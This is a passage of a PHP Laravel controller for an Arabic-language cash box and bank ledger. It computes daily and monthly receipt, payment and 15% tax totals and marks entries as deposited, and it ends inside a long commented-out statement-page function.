<?php

namespace App\Http\Controllers;

use App\Models\Car;
use App\Models\Employee;
use App\Models\Message;
use App\Models\CarDriver;
use App\Models\Geha;
use App\Models\Snd;
use App\Models\User;
use Carbon\Carbon;
use Illuminate\Support\Facades\Http;
use Illuminate\Http\Request;
use Illuminate\Support\Str;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\DB;



class BoxController extends Controller
{
    public function all()
    {
        return view('/admin/box/box');
    }

    public function sndDate($date)
    {
        $snds = Snd::whereNull('bank')->where(function ($query) {
            $query->where('payment_method', 'كاش')
                ->orWhereNull('payment_method');
        })
            ->where('date', $date)
            ->whereIn('type', ['قبض', 'صرف']) // ← هذا السطر يضيف الشرط المطلوب
            ->get();


        return view('admin.box.sndDate', compact('snds', 'date'));
    }

    public function snd()
    {
        $snds = Snd::whereNull('bank')->where(function ($query) {
            $query->where('payment_method', 'كاش')
                ->orWhereNull('payment_method');
        })
            ->whereIn('type', ['قبض', 'صرف']) // ← هذا السطر يضيف الشرط المطلوب
            ->get();
        //
        $grouped = $snds->groupBy('date');

        $report = [];

        foreach ($grouped as $date => $daySnds) {
            $count = $daySnds->count();

            $qabd = 0;
            $sarf = 0;
            $internal = 0;

            foreach ($daySnds as $snd) {
                $amount = floatval($snd->amount);
                $baseAmount = $amount;
                $taxAmount = 0;
                $taxLabel = $snd->tax;

                if ($taxLabel === 'شامل الضريبة') {
                    $baseAmount = $amount / 1.15;
                    $taxAmount = $amount - $baseAmount;
                    $totalAmount = $amount;
                } elseif ($taxLabel === 'غير شامل الضريبة') {
                    $taxAmount = $amount * 0.15;
                    $totalAmount = $amount + $taxAmount;
                } else {
                    $totalAmount = $amount;
                    $taxAmount = 0;
                }

                if ($snd->type == 'قبض') {
                    $qabd += $totalAmount;
                } elseif ($snd->type == 'صرف') {
                    $sarf += $totalAmount;
                } elseif ($snd->type == 'تحويل داخلي') {
                    $internal += $totalAmount;
                }
            }

            $balance = $qabd - $sarf;

            $report[] = [
                'date' => $date,
                'count' => $count,
                'qabd' => $qabd,
                'sarf' => $sarf,
                'internal' => $internal,
                'balance' => $balance,
            ];
        }

        // return view('admin.box.snd_report', compact('report'));

        //

        $cars = Car::whereNull('archive')->get();
        $gehas = Geha::get();

        $Employees = Employee::whereNull('archive')->get();

        // المتغيرات المطلوبة
        $total_base_qabd = 0;
        $total_base_sarf = 0;
        $total_qabd = 0;
        $total_sarf = 0;
        $tax_qabd = 0;
        $tax_sarf = 0;

        foreach ($snds as $snd) {
            $amount = floatval($snd->amount);
            $baseAmount = $amount;
            $taxAmount = 0;
            $taxLabel = $snd->tax;

            if ($taxLabel === 'شامل الضريبة') {
                $baseAmount = $amount / 1.15;
                $taxAmount = $amount - $baseAmount;
                $totalAmount = $amount;
            } elseif ($taxLabel === 'غير شامل الضريبة') {
                $taxAmount = $amount * 0.15;
                $totalAmount = $amount + $taxAmount;
            } else { // غير خاضع للضريبة
                $totalAmount = $amount;
                $taxAmount = 0;
            }

            if ($snd->type == 'قبض') {
                $total_base_qabd += $baseAmount;
                $total_qabd += $totalAmount;
                $tax_qabd += $taxAmount;
            } elseif ($snd->type == 'صرف') {
                $total_base_sarf += $baseAmount;
                $total_sarf += $totalAmount;
                $tax_sarf += $taxAmount;
            }
        }

        return view('/admin/box/snd', compact(
            'snds',
            'cars',
            'Employees',
            'gehas',
            'total_base_qabd',
            'total_base_sarf',
            'total_qabd',
            'total_sarf',
            'tax_qabd',
            'tax_sarf',
            'report'
        ));
    }

    //تحويل داخلي 
    public function sndDateInside($date)
    {
        $snds = Snd::whereNull('bank')->where(function ($query) {
            $query->where('payment_method', 'كاش')
                ->orWhereNull('payment_method');
        })
            ->where('date', $date)
            ->whereIn('type', ['تحويل داخلي']) // ← هذا السطر يضيف الشرط المطلوب
            ->get();


        return view('admin.box.sndDate', compact('snds', 'date'));
    }

    public function sndInside()
    {
        $snds = Snd::whereNull('bank')->where(function ($query) {
            $query->where('payment_method', 'كاش')
                ->orWhereNull('payment_method');
        })
            ->whereIn('type', ['تحويل داخلي']) // ← هذا السطر يضيف الشرط المطلوب
            ->get();
        //
        $grouped = $snds->groupBy('date');

        $report = [];

        foreach ($grouped as $date => $daySnds) {
            $count = $daySnds->count();

            $qabd = 0;
            $sarf = 0;
            $internal = 0;

            foreach ($daySnds as $snd) {
                $amount = floatval($snd->amount);
                $baseAmount = $amount;
                $taxAmount = 0;
                $taxLabel = $snd->tax;

                if ($taxLabel === 'شامل الضريبة') {
                    $baseAmount = $amount / 1.15;
                    $taxAmount = $amount - $baseAmount;
                    $totalAmount = $amount;
                } elseif ($taxLabel === 'غير شامل الضريبة') {
                    $taxAmount = $amount * 0.15;
                    $totalAmount = $amount + $taxAmount;
                } else {
                    $totalAmount = $amount;
                    $taxAmount = 0;
                }

                if ($snd->type == 'قبض') {
                    $qabd += $totalAmount;
                } elseif ($snd->type == 'صرف') {
                    $sarf += $totalAmount;
                } elseif ($snd->type == 'تحويل داخلي') {
                    $internal += $totalAmount;
                }
            }

            $balance = $qabd - $sarf;

            $report[] = [
                'date' => $date,
                'count' => $count,
                'qabd' => $qabd,
                'sarf' => $sarf,
                'internal' => $internal,
                'balance' => $balance,
            ];
        }

        // return view('admin.box.snd_report', compact('report'));

        //

        $cars = Car::whereNull('archive')->get();
        $gehas = Geha::get();

        $Employees = Employee::whereNull('archive')->get();

        // المتغيرات المطلوبة
        $total_base_qabd = 0;
        $total_base_sarf = 0;
        $total_qabd = 0;
        $total_sarf = 0;
        $tax_qabd = 0;
        $tax_sarf = 0;

        foreach ($snds as $snd) {
            $amount = floatval($snd->amount);
            $baseAmount = $amount;
            $taxAmount = 0;
            $taxLabel = $snd->tax;

            if ($taxLabel === 'شامل الضريبة') {
                $baseAmount = $amount / 1.15;
                $taxAmount = $amount - $baseAmount;
                $totalAmount = $amount;
            } elseif ($taxLabel === 'غير شامل الضريبة') {
                $taxAmount = $amount * 0.15;
                $totalAmount = $amount + $taxAmount;
            } else { // غير خاضع للضريبة
                $totalAmount = $amount;
                $taxAmount = 0;
            }

            if ($snd->type == 'قبض') {
                $total_base_qabd += $baseAmount;
                $total_qabd += $totalAmount;
                $tax_qabd += $taxAmount;
            } elseif ($snd->type == 'صرف') {
                $total_base_sarf += $baseAmount;
                $total_sarf += $totalAmount;
                $tax_sarf += $taxAmount;
            }
        }

        return view('/admin/box/sndInside', compact(
            'snds',
            'cars',
            'Employees',
            'gehas',
            'total_base_qabd',
            'total_base_sarf',
            'total_qabd',
            'total_sarf',
            'tax_qabd',
            'tax_sarf',
            'report'
        ));
    }
    //بوابة الدفع 

    public function sndDatesndOnlinePayment($date)
    {
        $snds = Snd::whereNull('bank')->where(function ($query) {
            $query->where('payment_method', 'بوابة الدفع');
        })
            ->where('date', $date)
            ->whereIn('type', ['قبض', 'صرف']) // ← هذا السطر يضيف الشرط المطلوب
            ->get();


        return view('admin.box.sndDate', compact('snds', 'date'));
    }

    public function sndOnlinePayment()
    {
        $snds = Snd::whereNull('bank')->where(function ($query) {
            $query->where('payment_method', 'بوابة الدفع');
        })
            ->whereIn('type', ['قبض', 'صرف']) // ← هذا السطر يضيف الشرط المطلوب
            ->get();
        //
        $grouped = $snds->groupBy('date');

        $report = [];

        foreach ($grouped as $date => $daySnds) {
            $count = $daySnds->count();

            $qabd = 0;
            $sarf = 0;
            $internal = 0;

            foreach ($daySnds as $snd) {
                $amount = floatval($snd->amount);
                $baseAmount = $amount;
                $taxAmount = 0;
                $taxLabel = $snd->tax;

                if ($taxLabel === 'شامل الضريبة') {
                    $baseAmount = $amount / 1.15;
                    $taxAmount = $amount - $baseAmount;
                    $totalAmount = $amount;
                } elseif ($taxLabel === 'غير شامل الضريبة') {
                    $taxAmount = $amount * 0.15;
                    $totalAmount = $amount + $taxAmount;
                } else {
                    $totalAmount = $amount;
                    $taxAmount = 0;
                }

                if ($snd->type == 'قبض') {
                    $qabd += $totalAmount;
                } elseif ($snd->type == 'صرف') {
                    $sarf += $totalAmount;
                } elseif ($snd->type == 'تحويل داخلي') {
                    $internal += $totalAmount;
                }
            }

            $balance = $qabd - $sarf;

            $report[] = [
                'date' => $date,
                'count' => $count,
                'qabd' => $qabd,
                'sarf' => $sarf,
                'internal' => $internal,
                'balance' => $balance,
            ];
        }

        // return view('admin.box.snd_report', compact('report'));

        //

        $cars = Car::whereNull('archive')->get();
        $gehas = Geha::get();

        $Employees = Employee::whereNull('archive')->get();

        // المتغيرات المطلوبة
        $total_base_qabd = 0;
        $total_base_sarf = 0;
        $total_qabd = 0;
        $total_sarf = 0;
        $tax_qabd = 0;
        $tax_sarf = 0;

        foreach ($snds as $snd) {
            $amount = floatval($snd->amount);
            $baseAmount = $amount;
            $taxAmount = 0;
            $taxLabel = $snd->tax;

            if ($taxLabel === 'شامل الضريبة') {
                $baseAmount = $amount / 1.15;
                $taxAmount = $amount - $baseAmount;
                $totalAmount = $amount;
            } elseif ($taxLabel === 'غير شامل الضريبة') {
                $taxAmount = $amount * 0.15;
                $totalAmount = $amount + $taxAmount;
            } else { // غير خاضع للضريبة
                $totalAmount = $amount;
                $taxAmount = 0;
            }

            if ($snd->type == 'قبض') {
                $total_base_qabd += $baseAmount;
                $total_qabd += $totalAmount;
                $tax_qabd += $taxAmount;
            } elseif ($snd->type == 'صرف') {
                $total_base_sarf += $baseAmount;
                $total_sarf += $totalAmount;
                $tax_sarf += $taxAmount;
            }
        }

        return view('/admin/box/onlinePayment', compact(
            'snds',
            'cars',
            'Employees',
            'gehas',
            'total_base_qabd',
            'total_base_sarf',
            'total_qabd',
            'total_sarf',
            'tax_qabd',
            'tax_sarf',
            'report'
        ));
    }

    //bank page 

    public function bank(request $request)
    {
        $query = Snd::where('bank', '1')->where(function ($query) {
            $query->where('payment_method', 'كاش')
                ->orWhereNull('payment_method');
        });

        if ($request->filled('from_date') && $request->filled('to_date')) {
            $query->whereBetween('date', [$request->from_date, $request->to_date]);
        }

        $snds = $query->get();
        $cars = Car::whereNull('archive')->get();
        $gehas = Geha::get();

        $Employees = Employee::whereNull('archive')->get();

        // المتغيرات المطلوبة
        $total_base_qabd = 0;
        $total_base_sarf = 0;
        $total_qabd = 0;
        $total_sarf = 0;
        $tax_qabd = 0;
        $tax_sarf = 0;

        foreach ($snds as $snd) {
            $amount = floatval($snd->amount);
            $baseAmount = $amount;
            $taxAmount = 0;
            $taxLabel = $snd->tax;

            if ($taxLabel === 'شامل الضريبة') {
                $baseAmount = $amount / 1.15;
                $taxAmount = $amount - $baseAmount;
                $totalAmount = $amount;
            } elseif ($taxLabel === 'غير شامل الضريبة') {
                $taxAmount = $amount * 0.15;
                $totalAmount = $amount + $taxAmount;
            } else { // غير خاضع للضريبة
                $totalAmount = $amount;
                $taxAmount = 0;
            }

            if ($snd->type == 'قبض') {
                $total_base_qabd += $baseAmount;
                $total_qabd += $totalAmount;
                $tax_qabd += $taxAmount;
            } elseif ($snd->type == 'صرف') {
                $total_base_sarf += $baseAmount;
                $total_sarf += $totalAmount;
                $tax_sarf += $taxAmount;
            }
        }

        //
        $grouped = $snds->groupBy(function ($item) {
            return \Carbon\Carbon::parse($item->date)->format('m-Y');
        });

        $report = [];

        foreach ($grouped as $monthYear => $monthSnds) {
            $count = $monthSnds->count();

            $qabd = 0;
            $sarf = 0;
            $internal = 0;

            foreach ($monthSnds as $snd) {
                $amount = floatval($snd->amount);
                $baseAmount = $amount;
                $taxAmount = 0;
                $taxLabel = $snd->tax;

                if ($taxLabel === 'شامل الضريبة') {
                    $baseAmount = $amount / 1.15;
                    $taxAmount = $amount - $baseAmount;
                    $totalAmount = $amount;
                } elseif ($taxLabel === 'غير شامل الضريبة') {
                    $taxAmount = $amount * 0.15;
                    $totalAmount = $amount + $taxAmount;
                } else {
                    $totalAmount = $amount;
                    $taxAmount = 0;
                }

                if ($snd->type == 'قبض') {
                    $qabd += $totalAmount;
                } elseif ($snd->type == 'صرف') {
                    $sarf += $totalAmount;
                } elseif ($snd->type == 'تحويل داخلي') {
                    $internal += $totalAmount;
                }
            }

            $balance = $qabd - $sarf;

            $report[] = [
                'month' => $monthYear,
                'count' => $count,
                'qabd' => $qabd,
                'sarf' => $sarf,
                'internal' => $internal,
                'balance' => $balance,
            ];
        }

        // return view('admin.box.monthly_report', compact('report'));

        //

        return view('/admin/box/bank', compact(
            'snds',
            'cars',
            'Employees',
            'gehas',
            'total_base_qabd',
            'total_base_sarf',
            'total_qabd',
            'total_sarf',
            'tax_qabd',
            'tax_sarf',
            'report'
        ));
    }


    //
    ///


    public function sndsByMonth($month)
    {
        // month لازم يكون بصيغة YYYY-MM مثلاً "2025-03"
        $month = trim($month); // تأكد مفيش مسافات
        $snds = Snd::where('bank', '1')->where(function ($query) {
            $query->where('payment_method', 'كاش')
                ->orWhereNull('payment_method');
        })
            ->where('date', 'like', "$month%")
            ->get();


        return view('admin.box.sndDateBank', compact('snds', 'month'));
    }



    ///
    public function postSndDateToBank($date)
    {
        Snd::where('date', $date)
            ->whereNull('bank')
            ->update(['bank' => 1]);
        toastr()->success('تم التاكيد بنجاح');
        return redirect()->back();
    }

    public function postSndToBank($id)
    {
        $snd = Snd::findOrFail($id);
        $snd->bank = 1;
        $snd->save();
        toastr()->success('تم التاكيد بنجاح');
        return redirect()->back();
    }

    //بنك الرياض
    public function postSndToBankAlRayad($id)
    {
        $snd = Snd::findOrFail($id);
        $snd->payment_method = "تحويل بنكي";
        $snd->bank_account = "شركة الجواب - بنك الرياض";
        $snd->save();
        toastr()->success('تم التاكيد بنجاح');
        return redirect()->back();
    }


    // public function calculateEmployeeStatement($employee_id)
    // {
    //     $employee = Employee::findOrFail($employee_id);
    //     $snds = Snd::where('employee_id', $employee_id)->get();

    //     $total_qabd = 0;
    //     $total_sarf = 0;
    //     $total_internal_transfer = 0;

    //     $statement = [];

    //     foreach ($snds as $snd) {
    //         $amount = floatval($snd->amount);
    //         $entryType = '';

    //         if ($snd->type === 'قبض') {
    //             $total_qabd += $amount;
    //             $entryType = 'له';
    //         } elseif ($snd->type === 'صرف') {
    //             $total_sarf += $amount;
    //             $entryType = 'عليه';
    //         } elseif ($snd->type === 'تحويل داخلي' && $snd->client_type === 'سيارة') {
    //             $total_internal_transfer += $amount;
    //             $entryType = 'عليه (تحويل داخلي)';
    //         }

    //         $statement[] = [
    //             'id' => $snd->id,
    //             'type' => $snd->type,
    //             'amount' => $amount,
    //             'client_type' => $snd->client_type,
    //             'description' => $snd->description,
    //             'date' => $snd->date,
    //             'entry_type' => $entryType,
    //         ];
    //     }

    //     $remaining = $total_qabd - ($total_internal_transfer + $total_sarf);

    //     return view('admin.employee.statement', compact(
    //         'employee',
    //         'statement',
    //         'total_qabd',
    //         'total_sarf',
    //         'total_internal_transfer',
    //         'remaining'
    //     ));
    // }

    // public function employeeStatementPage(Request $request)
    // {
    //     $employee_id = $request->employee_id;
    //     $month = $request->month;
    //     $year = $request->year;

    //     $employees = Employee::all();
    //     $employee = null;
    //     $statement = [];
    //     $total_qabd = 0;
    //     $total_sarf = 0;
    //     $total_internal_transfer = 0;
    //     $remaining = 0;

    //     // لو التلاتة متحددين
    //     if ($employee_id && $month && $year) {
    //         $employee = Employee::find($employee_id);

    //         $snds = Snd::where('employee_id', $employee_id)
    //             ->whereMonth('date', $month)
    //             ->whereYear('date', $year)
    //             ->get();

    //         foreach ($snds as $snd) {
    //             $amount = floatval($snd->amount);
    //             $entryType = '';

    //             if ($snd->type === 'قبض') {
    //                 $total_qabd += $amount;
    //                 $entryType = 'له';
    //             } elseif ($snd->type === 'صرف') {
    //                 $total_sarf += $amount;
    //                 $entryType = 'عليه';
    //             } elseif ($snd->type === 'تحويل داخلي' && $snd->client_type === 'سيارة') {
    //                 $total_internal_transfer += $amount;
    //                 $entryType = 'عليه (تحويل داخلي)';
    //             }

    //             $statement[] = [
    //                 'id' => $snd->id,
    //                 'type' => $snd->type,
    //                 'amount' => $amount,
    //                 'client_type' => $snd->client_type,
    //                 'description' => $snd->description,
    //                 'date' => $snd->date,
    //                 'entry_type' => $entryType,
    //             ];
    //         }

    //         $remaining = $total_qabd - ($total_internal_transfer + $total_sarf);
    //     }

    //     return view('/admin/box/account', compact(
    //         'employee',
    //         'employees',
    //         'statement',
    //         'total_qabd',
    //         'total_sarf',
    //         'total_internal_transfer',
    //         'remaining',
    //         'month',
    //         'year'
    //     ));
    // }



    // public function employeeStatementPage(Request $request)
    // {
    //     $employee_id = $request->employee_id;
    //     $month = $request->month;
    //     $year = $request->year;

    //     $employees = Employee::all();
    //     $employee = $employee_id ? Employee::find($employee_id) : null;

    //     // المتغيرات الافتراضية
    //     $statement = [];
    //     $total_qabd = 0;
    //     $total_sarf = 0;
    //     $total_internal_transfer = 0;
    //     $tax_qabd = 0;
    //     $tax_sarf = 0;
    //     $tax_internal_transfer = 0;
    //     $total_tax = 0;
    //     $remaining = 0;

    //     // فقط لو فيه فلترة نبدأ الحساب
    //     if ($employee_id) {
    //         $query = Snd::query();

    //         $query->where('employee_id', $employee_id);

    //         if ($month && $year) {
    //             $query->whereMonth('date', $month)->whereYear('date', $year);
    //         }

    //         $snds = $query->get();

    //         foreach ($snds as $snd) {
    //             $amount = floatval($snd->amount);
    //             $entryType = '';
    //             $taxLabel = $snd->tax;

    //             $baseAmount = $amount;
    //             $taxAmount = 0;
    //             $totalAmount = $amount;

    //             if ($taxLabel === 'شامل الضريبة') {
    //                 $baseAmount = $amount / 1.15;
    //                 $taxAmount = $amount - $baseAmount;
    //             } elseif ($taxLabel === 'غير شامل الضريبة') {
    //                 $taxAmount = $amount * 0.15;
    //                 $totalAmount = $amount + $taxAmount;
    //             }

    //             if ($snd->type === 'قبض') {
    //                 $total_qabd += $amount;
    //                 $tax_qabd += $taxAmount;
    //                 $entryType = 'له';
    //             } elseif ($snd->type === 'صرف') {
    //                 $total_sarf += $amount;
    //                 $tax_sarf += $taxAmount;
    //                 $entryType = 'عليه';
    //             } 
    //          elseif ($snd->type === 'تحويل داخلي') {
    //             if (in_array($snd->client_type, ['سيارة', 'جهة'])) {
    //                 $total_internal_transfer += $amount;
    //                 $tax_internal_transfer += $taxAmount;
    //                 $entryType = 'عليه (تحويل داخلي)';
    //             } elseif ($snd->client_type === 'موظف') {
    //                 $total_qabd += $amount;
    //                 $tax_qabd += $taxAmount;
    //                 $entryType = 'له (تحويل داخلي)';
    //             }
    //         }

    //             $total_tax += $taxAmount;

    //             $statement[] = [
    //                 'id' => $snd->id,
    //                 'type' => $snd->type,
    //                 'amount' => $amount,
    //                 'client_type' => $snd->client_type,
    //                 'description' => $snd->description,
    //                 'date' => $snd->date,
    //                 'entry_type' => $entryType,
    //                 'tax' => $taxLabel,
    //                 'tax_amount' => $taxAmount,
    //                 'total_amount' => $totalAmount,
    //             ];
    //         }

    //         $remaining = $total_qabd - ($total_internal_transfer + $total_sarf);
    //     }

    //     return view('/admin/box/account', compact(
    //         'employee',
    //         'employees',
    //         'statement',
    //         'total_qabd',
    //         'total_sarf',
    //         'total_internal_transfer',
    //         'remaining',
    //         'tax_qabd',
    //         'tax_sarf',
    //         'tax_internal_transfer',
    //         'total_tax',
    //         'month',
    //         'year'
    //     ));
    // }






    //     public function employeeStatementPage(Request $request)
    // {
    //     $employees = Employee::all();
    //     $statement = [];
    //     $employee = null;
    //     $total_qabd = $total_sarf = $total_internal_transfer = $remaining = 0;

    //     if ($request->filled('employee_id')) {
    //         $employee = Employee::findOrFail($request->employee_id);
    //         $snds = Snd::where('employee_id', $request->employee_id)->get();

    //         foreach ($snds as $snd) {
    //             $amount = floatval($snd->amount);
    //             $entryType = '';

    //             if ($snd->type === 'قبض') {
    //                 $total_qabd += $amount;
    //                 $entryType = 'له';
    //             } elseif ($snd->type === 'صرف') {
    //                 $total_sarf += $amount;
    //                 $entryType = 'عليه';
    //             } elseif ($snd->type === 'تحويل داخلي' && $snd->client_type === 'سيارة') {
    //                 $total_internal_transfer += $amount;
    //                 $entryType = 'عليه (تحويل داخلي)';
    //             }

    //             $statement[] = [
    //                 'id' => $snd->id,
    //                 'type' => $snd->type,
    //                 'amount' => $amount,
    //                 'client_type' => $snd->client_type,
    //                 'description' => $snd->description,
    //                 'date' => $snd->date,
    //                 'entry_type' => $entryType,
    //             ];
    //         }

    //         $remaining = $total_qabd - ($total_internal_transfer + $total_sarf);
    //     }

    //     return view('/admin/box/account', compact(
    //         'employees', 'employee', 'statement',
    //         'total_qabd', 'total_sarf', 'total_internal_transfer', 'remaining'
    //     ));
    // }




    //     public function employeeStatementPage(Request $request)
    //     {
    //         $filter_type = $request->filter_type;
    //         $item_id = $request->item_id;
    //         $month = $request->month;
    //         $year = $request->year;

    //         $employees = Employee::all();
    //         $vehicles = Car::all();
    //         $gehas = Geha::all();

    //         $items = [];
    //         $selectedItem = null;
    //         $statement = [];

    //         $total_qabd = 0;
    //         $total_sarf = 0;
    //         $total_internal_transfer = 0;
    //         $tax_qabd = 0;
    //         $tax_sarf = 0;
    //         $tax_internal_transfer = 0;
    //         $total_tax = 0;
    //         $remaining = 0;

    //         if ($filter_type) {
    //             if ($filter_type == 'employee') {
    //                 $items = $employees;
    //             } elseif ($filter_type == 'vehicle') {
    //                 $items = $vehicles;
    //             } elseif ($filter_type == 'geha') {
    //                 $items = $gehas;
    //             }
    //         }

    //         if ($filter_type && $item_id) {
    //             $query = Snd::query();

    //             if ($filter_type == 'employee') {
    //                 $query->where('employee_id', $item_id);
    //                 $selectedItem = Employee::find($item_id);
    //             } elseif ($filter_type == 'vehicle') {
    //                 $query->where('client_type', 'سيارة')->where('car_id', $item_id);
    //                 $selectedItem = Car::find($item_id);
    //             } elseif ($filter_type == 'geha') {
    //                 $query->where(function ($q) use ($item_id) {
    //                     $q->where(function ($sub) use ($item_id) {
    //                         $sub->where('client_type', 'جهة')
    //                             ->where('geha_id', $item_id);
    //                     })->orWhere(function ($sub) use ($item_id) {
    //                         $sub->where('type', 'تحويل داخلي')
    //                             ->where('client_type', '!=', 'جهة')
    //                             ->where('geha_id', $item_id); // نفترض أن الجهة دي هي المرسلة
    //                     });
    //                 });

    //                 $selectedItem = Geha::find($item_id);
    //             }

    //             if ($month && $year) {
    //                 $query->whereMonth('date', $month)->whereYear('date', $year);
    //             }

    //             $snds = $query->get();

    //             foreach ($snds as $snd) {
    //                 $amount = floatval($snd->amount);
    //                 $taxLabel = $snd->tax;
    //                 $taxAmount = 0;
    //                 $totalAmount = $amount;

    //                 if ($taxLabel === 'شامل الضريبة') {
    //                     $baseAmount = $amount / 1.15;
    //                     $taxAmount = $amount - $baseAmount;
    //                 } elseif ($taxLabel === 'غير شامل الضريبة') {
    //                     $taxAmount = $amount * 0.15;
    //                     $totalAmount = $amount + $taxAmount;
    //                 }

    //                 if ($snd->type === 'قبض') {
    //                     $total_qabd += $amount;
    //                     $tax_qabd += $taxAmount;
    //                 } elseif ($snd->type === 'صرف') {
    //                     $total_sarf += $amount;
    //                     $tax_sarf += $taxAmount;
    //                 } elseif ($snd->type === 'تحويل داخلي') {
    //                     $isSameClient = false;

    //                     if ($filter_type === 'employee' && $snd->client_type === 'موظف' && $snd->employee_id == $item_id) {
    //                         $isSameClient = true;
    //                     } elseif ($filter_type === 'vehicle' && $snd->client_type === 'سيارة' && $snd->car_id == $item_id) {
    //                         $isSameClient = true;
    //                     } elseif ($filter_type === 'geha' && $snd->client_type === 'جهة' && $snd->geha_id == $item_id) {
    //                         $isSameClient = true;
    //                     }

    //                     if ($isSameClient) {
    //                         $total_qabd += $amount;
    //                         $tax_qabd += $taxAmount;
    //                     } else {
    //                         $total_internal_transfer += $amount;
    //                         $tax_internal_transfer += $taxAmount;
    //                     }
    //                 }

    //                 $statement[] = [
    //                     'id' => $snd->id,
    //                     'type' => $snd->type,
    //                     'amount' => $amount,
    //                     'client_type' => $snd->client_type,
    //                     'description' => $snd->description,
    //                     'date' => $snd->date,
    //                     'tax' => $taxLabel,
    //                     'tax_amount' => $taxAmount,
    //                     'total_amount' => $totalAmount,
    //                 ];
    //             }

    //             $total_tax = $tax_qabd + $tax_sarf + $tax_internal_transfer;
    //             $remaining = $total_qabd - ($total_sarf + $total_internal_transfer);
    //         }
    //         //

    // $monthlyStatements = [];

    // foreach ($snds as $snd) {
    //     $monthKey = \Carbon\Carbon::parse($snd->date)->format('Y-m');
    //     $monthLabel = \Carbon\Carbon::parse($snd->date)->translatedFormat('F Y'); // مثلا: مايو 2025

    //     $amount = floatval($snd->amount);
    //     $taxLabel = $snd->tax;
    //     $taxAmount = 0;
    //     $totalAmount = $amount;

    //     if ($taxLabel === 'شامل الضريبة') {
    //         $baseAmount = $amount / 1.15;
    //         $taxAmount = $amount - $baseAmount;
    //     } elseif ($taxLabel === 'غير شامل الضريبة') {
    //         $taxAmount = $amount * 0.15;
    //         $totalAmount = $amount + $taxAmount;
    //     }

    //     $type = $snd->type;

    //     if (!isset($monthlyStatements[$monthKey])) {
    //         $monthlyStatements[$monthKey] = [
    //             'label' => $monthLabel,
    //             'snds' => [],
    //             'count' => 0,
    //             'total_qabd' => 0,
    //             'total_sarf' => 0,
    //             'total_internal_transfer' => 0,
    //         ];
    //     }

    //     $monthlyStatements[$monthKey]['snds'][] = [
    //         'id' => $snd->id,
    //         'type' => $type,
    //         'amount' => $amount,
    //         'client_type' => $snd->client_type,
    //         'description' => $snd->description,
    //         'date' => $snd->date,
    //         'tax' => $taxLabel,
    //         'tax_amount' => $taxAmount,
    //         'total_amount' => $totalAmount,
    //     ];

    //     $monthlyStatements[$monthKey]['count']++;

    //     if ($type === 'قبض') {
    //         $monthlyStatements[$monthKey]['total_qabd'] += $amount;
    //     } elseif ($type === 'صرف') {
    //         $monthlyStatements[$monthKey]['total_sarf'] += $amount;
    //     } elseif ($type === 'تحويل داخلي') {
    //         $isSameClient = false;

    //         if ($filter_type === 'employee' && $snd->client_type === 'موظف' && $snd->employee_id == $item_id) {
    //             $isSameClient = true;
    //         } elseif ($filter_type === 'vehicle' && $snd->client_type === 'سيارة' && $snd->car_id == $item_id) {
    //             $isSameClient = true;
    //         } elseif ($filter_type === 'geha' && $snd->client_type === 'جهة' && $snd->geha_id == $item_id) {
    //             $isSameClient = true;
    //         }

    //         if (!$isSameClient) {
    //             $monthlyStatements[$monthKey]['total_internal_transfer'] += $amount;
    //         }
    //     }
    // }

    //         //

    //         return view('/admin/box/account', compact(
    //             'filter_type',
    //             'item_id',
    //             'selectedItem',
    //             'employees',
    //             'vehicles',
    //             'gehas',
    //             'items',
    //             'statement',
    //             'total_qabd',
    //             'total_sarf',
    //             'total_internal_transfer',
    //             'remaining',
    //             'tax_qabd',
    //             'tax_sarf',
    //             'tax_internal_transfer',
    //             'total_tax',
    //             'month',
    //             'year',
    //             'monthlyStatements'

    //         ));
    //     }


    // public function employeeStatementPage(Request $request)
    // {
    //     $filter_type = $request->filter_type;
    //     $item_id = $request->item_id;
    //     $month = $request->month;
    //     $year = $request->year;
    //     $employees = Employee::whereNull('archive')->get();
    //     $vehicles = Car::whereNull('archive')->get();
    //     $gehas = Geha::all();

    //     $items = [];
    //     $selectedItem = null;
    //     $statement = [];
    //     $snds = collect(); // تعريف المتغير لتجنب الخطأ

    //     $total_qabd = 0;
    //     $total_sarf = 0;
    //     $total_internal_transfer = 0;
    //     $tax_qabd = 0;
    //     $tax_sarf = 0;
    //     $tax_internal_transfer = 0;
    //     $total_tax = 0;
    //     $remaining = 0;

    //     if ($filter_type) {
    //         if ($filter_type == 'employee') {
    //             $items = $employees;
    //         } elseif ($filter_type == 'vehicle') {
    //             $items = $vehicles;
    //         } elseif ($filter_type == 'geha') {
    //             $items = $gehas;
    //         }
    //     }

    //     if ($filter_type && $item_id) {
    //         $query = Snd::query();

    //         if ($filter_type == 'employee') {
    //             $query->where('employee_id', $item_id);
    //             $selectedItem = Employee::find($item_id);
    //         } elseif ($filter_type == 'vehicle') {
    //             $query->where('client_type', 'سيارة')->where('car_id', $item_id);
    //             $selectedItem = Car::find($item_id);
    //         } elseif ($filter_type == 'geha') {
    //             $query->where(function ($q) use ($item_id) {
    //                 $q->where(function ($sub) use ($item_id) {
    //                     $sub->where('client_type', 'جهة')
    //                         ->where('geha_id', $item_id);
    //                 })->orWhere(function ($sub) use ($item_id) {
    //                     $sub->where('type', 'تحويل داخلي')
    //                         ->where('client_type', '!=', 'جهة')
    //                         ->where('geha_id', $item_id);
    //                 });
    //             });

    //             $selectedItem = Geha::find($item_id);
    //         }

    //         if ($month && $year) {
    //             $query->whereMonth('date', $month)->whereYear('date', $year);
    //         }

    //         $snds = $query->get();

    //         foreach ($snds as $snd) {
    //             $amount = floatval($snd->amount);
    //             $taxLabel = $snd->tax;
    //             $taxAmount = 0;
    //             $totalAmount = $amount;

    //             if ($taxLabel === 'شامل الضريبة') {
    //                 $baseAmount = $amount / 1.15;
    //                 $taxAmount = $amount - $baseAmount;
    //             } elseif ($taxLabel === 'غير شامل الضريبة') {
    //                 $taxAmount = $amount * 0.15;
    //                 $totalAmount = $amount + $taxAmount;
    //             }

    //             if ($snd->type === 'قبض') {
    //                 $total_qabd += $amount;
    //                 $tax_qabd += $taxAmount;
    //             } elseif ($snd->type === 'صرف') {
    //                 $total_sarf += $amount;
    //                 $tax_sarf += $taxAmount;
    //             } elseif ($snd->type === 'تحويل داخلي') {
    //                 $isSameClient = false;

    //                 if ($filter_type === 'employee' && $snd->client_type === 'موظف' && $snd->employee_id == $item_id) {
    //                     $isSameClient = true;
    //                 } elseif ($filter_type === 'vehicle' && $snd->client_type === 'سيارة' && $snd->car_id == $item_id) {
    //                     $isSameClient = true;
    //                 } elseif ($filter_type === 'geha' && $snd->client_type === 'جهة' && $snd->geha_id == $item_id) {
    //                     $isSameClient = true;
    //                 }

    //                 if ($isSameClient) {
